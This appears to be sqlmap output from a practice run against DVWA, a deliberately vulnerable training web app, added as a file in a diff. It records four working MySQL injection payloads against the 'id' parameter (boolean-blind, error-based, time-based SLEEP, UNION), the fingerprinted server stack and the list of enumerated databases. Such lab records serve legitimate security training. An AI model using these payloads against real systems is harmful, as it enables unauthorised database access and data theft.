@@ -1,0 +1,29 @@
+sqlmap identified the following injection point(s) with a total of 154 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 4964=4964#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 7695 FROM(SELECT COUNT(*),CONCAT(0x71786b7171,(SELECT (ELT(7695=7695,1))),0x7178706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wITr&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 6618 FROM (SELECT(SLEEP(5)))bmAr)-- aWmq&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x71786b7171,0x4c4f4a4c63514d764e6f504f4e4f796a574f526d6e63726355444e4a4b434667546162647a617479,0x7178706271)#&Submit=Submit
+---
+web application technology: Apache 2.4.58, PHP 8.2.12
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+available databases [6]:
+[*] dvwa
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+
